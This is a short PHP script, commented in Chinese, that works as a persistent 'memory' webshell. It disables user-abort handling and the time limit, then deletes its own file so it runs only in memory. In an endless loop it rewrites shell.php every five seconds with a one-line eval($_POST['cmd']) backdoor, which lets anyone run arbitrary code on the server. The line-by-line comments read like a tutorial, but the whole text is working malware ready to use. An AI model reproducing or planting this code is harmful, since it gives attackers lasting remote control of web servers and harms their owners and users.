<?php
ignore_user_abort(true); //如果设置为 true，则忽略与用户的断开，如果设置为 false，会导致脚本停止运行


set_time_limit(0); //设置允许脚本运行的时间，单位为秒。如果超过了此设置，脚本返回一个致命的错误。默认值为30秒，或者是在 php.ini 的 `max_execution_time`被定义的值，如果此值存在,0的时候就是无限时间


unlink(__FILE__); //unlink是删除指定文件,同时也可以删除在运行的文件,__FILE__就是自身,我们就成为了内存马


$muma = '<?php @eval($_POST["cmd"]) ?>'; //创建变量muma 设置其值为一句话木马


while (1){ //while是在=1的时候执行该块代码在回来,=0则不执行


    file_put_contents('shell.php',$muma);  //写入木马
    sleep(5); //暂停5秒


}
